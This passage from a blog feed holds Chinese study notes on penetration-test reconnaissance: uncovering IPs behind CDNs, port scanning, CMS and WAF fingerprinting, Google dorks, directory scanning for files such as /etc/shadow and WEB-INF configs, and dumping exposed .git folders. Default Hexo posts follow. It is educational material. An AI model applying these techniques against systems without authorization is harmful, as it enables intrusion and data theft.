id="2-IP相关的信息"><a href="#2-IP相关的信息" class="headerlink" title="2. IP相关的信息"></a>2. IP相关的信息</h3><h4 id="DNS服务器类型"><a href="#DNS服务器类型" class="headerlink" title="DNS服务器类型"></a>DNS服务器类型</h4><pre><code class="hljs">1.本地域名服务器2.根域名服务器3.顶级域名服务器4.授权域名服务器 DNS解析流程迭代查询：    我告诉你去哪个服务器查询，依次查询递归查询：    我帮你去下一个服务器查询，层层返回</code></pre><h4 id="如何根据域名获得IP"><a href="#如何根据域名获得IP" class="headerlink" title="如何根据域名获得IP"></a>如何根据域名获得IP</h4><pre><code class="hljs">工具：    ping    nslookupIP归属：    http://ipwhois.cnnic.net.cn/</code></pre><h4 id="如何获得CDN背后的真实IP"><a href="#如何获得CDN背后的真实IP" class="headerlink" title="如何获得CDN背后的真实IP"></a>如何获得CDN背后的真实IP</h4><p>CDN：</p><pre><code class="hljs">内容分发网络    解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度和成功率。    控制时延无疑是现代信息科技的重要指标，CDN的意图就是尽可能的减少资源在转发、传输、链路抖动等情况下顺利保障信息的连贯性。通俗易懂：    让在各个不同的地点的网络用户，都可以迅速访问到网站提供的内容常见厂商：    帝联/蓝讯/网宿/七牛云/腾讯/百度/阿里云...实现流程（以阿里云为例）：    https://www.zhihu.com/question/36514327/answer/1604554133</code></pre><p>获取真实IP：</p><pre><code class="hljs">1.超级PING    查看IP数量：        http://ping.chinaz.com/        nslookup2.历史DNS    https://sitereport.netcraft.com/?url=    DNSdb：https://dnsdb.io/zh-cn/    微步在线：https://x.threatbook.cn3.通过子域名查询IP    思路：不重要的网站没有挂CDN4.国外主机解析    https://asm.ca.com/zh_cn/ping.php    http://host-tracker.com/    http://www.webpagetest.org/    https://dnscheck.pingdom.com/5.其他    网络空间搜索引擎：fofa,censys    邮箱：    手机APP抓包：    微信服务号抓包：</code></pre><h3 id="3-端口服务相关的信息"><a href="#3-端口服务相关的信息" class="headerlink" title="3. 端口服务相关的信息"></a>3. 端口服务相关的信息</h3><pre><code class="hljs">1.端口扫描思路：    1）一个服务对应一个端口。    2）本机端口查询：        Windows：nststat -ano|findstr 3306        Linux：netstat -an|grep 3306    3）远程机器端口：        telnet ip:端口        wget ip:端口        nc -vz ip:端口2.常见端口及漏洞（端口服务信息课件）    文件共享服务    远程连接服务    web应用服务    数据库服务    邮件服务    网络常见协议    特殊服务3.端口扫描工具    nmap:（nmap使用技巧）        基本介绍            1）扫描主机            2）扫描端口            3）探测操作系统，软件版本        参数分类        参数示例        脚本    其它工具：        masscan、nbtscan        http://coolaf.com/tool/port</code></pre><h3 id="4-指纹识别（CMS-CDF-WAF）"><a href="#4-指纹识别（CMS-CDF-WAF）" class="headerlink" title="4. 指纹识别（CMS&#x2F;CDF&#x2F;WAF）"></a>4. 指纹识别（CMS&#x2F;CDF&#x2F;WAF）</h3><h4 id="什么是指纹识别："><a href="#什么是指纹识别：" class="headerlink" title="什么是指纹识别："></a>什么是指纹识别：</h4><pre><code class="hljs">根据关键特征，识别程序名称，版本等信息识别对象：        1、CMS信息：        比如Discuz、织梦、帝国CMS、PHPCMS、ECshop等；    2、前端技术：        比如HTML5、jquery、bootstrap、Vue、ace等；    3、开发语言：        比如PHP、Java、Ruby、Python、C#等；    4、Web服务器：        比如Apache、 Nginx,、IIS、lighttpd等；    5、应用服务器：        比如Tomcat、Jboss、Weblogic、Websphere等；    6、操作系统信息：        比如Linux、win2k8、win7、Kali、Centos等；    7、CDN信息：        是否使用CDN，如cloudflare、帝联、蓝讯、网宿、七牛云、阿里云等；    8、WAF信息：        是否使用WAF，如D盾、云锁、宝塔、安全狗、360等</code></pre><h4 id="什么是CMS"><a href="#什么是CMS" class="headerlink" title="什么是CMS"></a>什么是CMS</h4><pre><code class="hljs">Content Management System 内容管理系统 常见CMS:            企业建站系统：        MetInfo(米拓)、蝉知、SiteServer CMS等;    B2C商城系统：        商派Shopex、ECshop、HiShop、XpShop等;    门户建站系统：        DedeCMS(织梦)、帝国CMS、PHPCMS、动易、CmsTop等;    博客系统：        WordPress、Z-Blog等;    论坛社区：        Discuz、PHPwind、WeCenter等;    问答系统：        Tipask、whatsns等;    知识百科系统：        HDwiki;    B2B门户系统：        Destoon、B2Bbuilder、友邻B2B等;    人才招聘网站系统：        骑士CMS、PHP云人才管理系统;    房产网站系统：        FangCms等;    在线教育建站系统：        Kesion、EduSoho;    电影网站系统：        苹果CMS、ctcms、movcms等;    小说文学建站系统：        杰奇CMS;</code></pre><h4 id="CMS指纹识别的思路"><a href="#CMS指纹识别的思路" class="headerlink" title="CMS指纹识别的思路"></a>CMS指纹识别的思路</h4><pre><code class="hljs">版权信息    Powered by XXX 特定的文件MD5     https://github.com/Lucifer1993/cmsprint查看网页源码    分析特定的路径或者代码内容特定文件    比如robots.txt</code></pre><h4 id="CMS指纹识别的工具"><a href="#CMS指纹识别的工具" class="headerlink" title="CMS指纹识别的工具"></a>CMS指纹识别的工具</h4><pre><code class="hljs">Kali自带工具：    whatweb    cmseek浏览器插件：    whatruns    Wappalyzer在线网站    http://whatweb.bugscaner.com    http://finger.tidesec.com/离线工具：    御剑指纹扫描器（需要.NET Framework）    Test404轻量CMS指纹识别其他开源程序    https://github.com/Tuhinshubhra/CMSeeK</code></pre><h4 id="CDN指纹识别工具"><a href="#CDN指纹识别工具" class="headerlink" title="CDN指纹识别工具"></a>CDN指纹识别工具</h4><pre><code class="hljs">基本工具：    kali自带lbd    load balance detector专用识别工具：    http://cdn.chinaz.com/    https://www.cdnplanet.com/tools/cdnfinder/其他    https://github.com/boy-hack/w8fuckcdn/    https://github.com/3xp10it/xcdn</code></pre><h4 id="WAF指纹识别"><a href="#WAF指纹识别" class="headerlink" title="WAF指纹识别"></a>WAF指纹识别</h4><p>WAF是什么：</p><pre><code class="hljs">Web Application Firewall Web 应用防火墙过滤HTTP或者HTTPS的请求，识别并拦截恶意的请求</code></pre><p>类型：</p><pre><code class="hljs">硬件型 WAF软件型 WAF云 WAF软件型 WAF软件型 WAF部署在 Apache、Nginx 等 HTTP Server 中)</code></pre><p>WAF的作用：</p><pre><code class="hljs">l SQL Injection (SQLi)：阻止SQL注入l Cross Site Scripting (XSS)：阻止跨站脚本攻击l Local File Inclusion (LFI)：阻止利用本地文件包含漏洞进行攻击l Remote File Inclusione(RFI)：阻止利用远程文件包含漏洞进行攻击l Remote Code Execution (RCE)：阻止利用远程命令执行漏洞进行攻击l PHP Code Injectiod：阻止PHP代码注入l HTTP Protocol Violations：阻止违反HTTP协议的恶意访问l HTTPoxy：阻止利用远程代理感染漏洞进行攻击l Sshllshock：阻止利用Shellshock漏洞进行攻击l Session Fixation：阻止利用Session会话ID不变的漏洞进行攻击l Scanner Detection：阻止黑客扫描网站l Metadata/Error Leakages：阻止源代码/错误信息泄露l Project Honey Pot Blacklist：蜜罐项目黑名单l GeoIP Country Blocking：根据判断IP地址归属地来进行IP阻断</code></pre><p>WAF的识别思路：</p><pre><code class="hljs">额外的cookie；任何响应或请求的附加标头；响应内容（如果被阻止请求）；响应代码（如果被阻止请求）；IP地址（云WAF）；JS客户端模块（客户端WAF）</code></pre><p>指纹库：</p><pre><code class="hljs">https://github.com/CSecGroup/wafid/blob/master/finger.xml</code></pre><p>WAF指纹识别工具：</p><pre><code class="hljs">Kali自带：    https://github.com/EnableSecurity/wafw00f    用法：wafw00f https://www.12306.cnnmap：     nmap www.12306.cn --script=http-waf-detect.nsesqlmap -u &quot;xxx.com?id=1&quot; --identify-waf其他：(WAF文档)    https://github.com/0xInfection/Awesome-WAF</code></pre><h3 id="5-搜索引擎收集"><a href="#5-搜索引擎收集" class="headerlink" title="5.搜索引擎收集"></a>5.搜索引擎收集</h3><p>Google Hacking</p><pre><code class="hljs">Google DorksGoogle Hacking</code></pre><p>运算符：</p><pre><code class="hljs">完全匹配：“”包裹任意字词：不包含：-xxx数字范围：xx..xx</code></pre><p>高级语法：</p><pre><code class="hljs">只搜索某个网站的内容：site:xxx.com网页的内容包含：allintext: xxxxxx                intext:xxxxx标题出现：allintitle:xxxx            intitle:xxxxURL地址包含：allinurl:xxxx                inurl:xxxx文件类型指定：filetype: xxxxindex of:文件目录结构泄露</code></pre><p>语法数据库：</p><pre><code class="hljs">https://www.exploit-db.com/google-hacking-databasehttps://github.com/BullsEye0/google_dork_ list</code></pre><p>工具：（github搜索）</p><pre><code class="hljs">google hackinggoogle dorks</code></pre><h3 id="6-网络空间搜索引擎"><a href="#6-网络空间搜索引擎" class="headerlink" title="6. 网络空间搜索引擎"></a>6. 网络空间搜索引擎</h3><p>什么是网络空间：</p><pre><code class="hljs">OSINT：Open source intelligence（开源网络情报）网络系统：网络设备：工业系统：</code></pre><p>怎么扫描？</p><pre><code class="hljs">网络扫描的工具：方式：    IP库    枚举</code></pre><p>怎么标识一个设备呢？</p><pre><code class="hljs">URLIP开放端口操作系统 物理地址MAC地址设备类型</code></pre><p>实施威胁地图：</p><p><a href="https://cybermap.kaspersky.com/cn">https://cybermap.kaspersky.com/cn</a></p><p>工具：</p><pre><code class="hljs">shodancensyszoomEyefofa</code></pre><h3 id="7-目录扫描"><a href="#7-目录扫描" class="headerlink" title="7. 目录扫描"></a>7. 目录扫描</h3><p>什么是目录扫描：</p><pre><code class="hljs">部署的网站有一些敏感的文件：        配置文件：xxx.cfg    数据文件：xxx.sql                xxx.tar.gz    目录：/backup                /conf                /admin</code></pre><p>目录扫描会泄露哪些信息：</p><pre><code class="hljs">数据库用户名和密码服务器的用户名和密码网站源码数据库的文件。。。。。</code></pre><p>为什么会泄露：</p><pre><code class="hljs">配置不当的问题。本地文件包含：(local file inclusion（LFI）)        PHP：        header.php        common.php        footer.php        function.php        include()-文件包含函数    require()</code></pre><h4 id="常见的敏感目录和文件"><a href="#常见的敏感目录和文件" class="headerlink" title="常见的敏感目录和文件"></a>常见的敏感目录和文件</h4><p>网站的备份文件&#x2F;数据</p><pre><code class="hljs">在线压缩帝国备份王</code></pre><p>后台登录的目录</p><pre><code class="hljs">/admin/manage</code></pre><p>安装包(源码)</p><pre><code class="hljs">非开源，商用</code></pre><p>上传的目录</p><pre><code class="hljs">文件上传漏洞 - webshell/upload/upload.php</code></pre><p>mysql的管理界面</p><pre><code class="hljs">mysqlweb页面去管理phpadmin - 密码爆破 - webshell</code></pre><p>程序的安装路径-&#x2F;install</p><p>php的探针</p><pre><code class="hljs">phpinfo</code></pre><p>文本编辑器</p><pre><code class="hljs">UeditorkindeditorCKeditor文件上传漏洞，命令注入</code></pre><p>Linux</p><pre><code class="hljs">/etc/passwd/etc/shadow - SHA512/etc/sudoers - sudo</code></pre><p>MacOS- .DS_Store</p><p>目录穿越</p><pre><code class="hljs">windows IISApache</code></pre><p>tomcat WEB-INF</p><pre><code class="hljs">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)</code></pre><p>编辑器的临时文件.swp文件</p><p>robots.txt</p><p>sitemap.xml</p><p>其它非常规文件</p><pre><code class="hljs">secret.txtpassword.txt</code></pre><h4 id="文件扫描思路"><a href="#文件扫描思路" class="headerlink" title="文件扫描思路"></a>文件扫描思路</h4><pre><code class="hljs">    直接在域名后面拼接路径/文件名，如果返回200，就是存在扫描方法：    暴力破解    字典：(kali 中自带的字典)        kali - wordlists        dirb - /usr/share/wordlists/dirb/common.txt    爬虫：        robots.txt        sitemap.xml        网页中的其它连接    fuzz(模糊测试)：</code></pre><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>dirb</p><pre><code class="hljs">kali常用</code></pre><p>burp suite</p><p>dirbrute</p><pre><code class="hljs">需要字典</code></pre><p>dirmap </p><pre><code class="hljs">一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑https://github.com/H4ckForJob/dirmap</code></pre><p>wfuzz</p><h3 id="8-Git-Hack"><a href="#8-Git-Hack" class="headerlink" title="8. Git Hack"></a>8. Git Hack</h3><h4 id="什么是版本控制系统"><a href="#什么是版本控制系统" class="headerlink" title="什么是版本控制系统"></a>什么是版本控制系统</h4><p>Version Control System </p><pre><code class="hljs">是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。版本控制系统不仅可以应用于软件源代码的文本文件，而且可以对任何类型的文件进行版本控制。用的比较多的如svn，git等。</code></pre><p>发展阶段：</p><pre><code class="hljs">版本管理    本地VCS协同开发    文件冲突？                自动合并不冲突的内容        标记冲突的内容    集中化的VCS        Centralized Version Control Systems(CVCS)        代表：            CVS ，SVN去中心化        分布式CVS        Distributed Version Control System(DVCS)                代表：            Github、Gitlab、码云            Git</code></pre><h4 id="为什么Git会导致信息泄露"><a href="#为什么Git会导致信息泄露" class="headerlink" title="为什么Git会导致信息泄露"></a>为什么Git会导致信息泄露</h4><p>把私有仓库&#x2F;隐私文件提交到了github</p><p>部署项目的时候，不小心把 .git 文件一起打包进去，放到web网站的目录下</p><pre><code class="hljs">.git有用的内容        .git/logs/HEAD - 存储了git的log信息，可以找到历史的commit项    .git/index - 缓存git add的文件，暂存区    .git/refs/stash - git stash - 把代码存入缓存区    .git/refs/heads/master - .git/refs/heads/master    .git/objects/pack/.pack</code></pre><h4 id="Github搜索技巧"><a href="#Github搜索技巧" class="headerlink" title="Github搜索技巧"></a>Github搜索技巧</h4><pre><code class="hljs">kali in:file  搜索文件中包含kali的代码kali in:path  搜索路径中包含kali的代码kali in:path,file  搜索路径、文件中包含kali的代码shodan language:python  搜索关键字shodan，语言为python的代码filename:config.php language:php  搜索文件名为config.php， 且语言为phpkali topics:&gt;=5  标签数量大于等于5的kali size:&lt;1000  文件小于1KB的kali stars:10..50  star大于10小于50的kali pushed:&gt;2021-08-15  搜索在2021年8月15日之后提交的kali pushed:2021-07-01..2021-08-01  搜索在此区间kali created:&gt;=2021-06-01  创建时间kali pushed:&lt;2021-08-01 -language:java  搜索在2020年8月1日前push代码且排除java语言</code></pre><h4 id="Git信息泄露利用方式"><a href="#Git信息泄露利用方式" class="headerlink" title="Git信息泄露利用方式"></a>Git信息泄露利用方式</h4><pre><code class="hljs">找到.git     1）目录扫描    2）robots.txt    3）搜索引擎： intitle:&quot;index of /.git&quot;把.git下载到本地    https://github.com/WangYihang/GitHacker用git命令获取内容    git log获取提交记录    git reset --hard [log hash]恢复到某个版本    git diff对比版本差异Git 基本指令的使用https://blog.csdn.net/qtiao/article/details/97783243    git config：配置信息    git add：添加文件到缓存命令    git status：查看文件的状态命令    git diff：查看更新的详细信息命令        尚未缓存的改动：git diff        查看已缓存的改动： git diff --cached        查看已缓存的与未缓存的所有改动：git diff HEAD        显示摘要而非整个 diff：git diff --stat    git commit：提交命令        如果你觉得 每次 commit之前要add一下，想跳过add这一步，可以直接使用 -a选项,如：        git commit -am &quot;第一次版本提交&quot;    git reset HEAD：取消缓存命令    git rm：删除命令    git mv：移动或重命名命令工具    https://github.com/gakki429/Git_Extract</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web安全基础</title>
    <link href="/2023/10/07/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/10/07/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/06/hello-world/"/>
    <url>/2023/10/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/1.png" alt="1"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
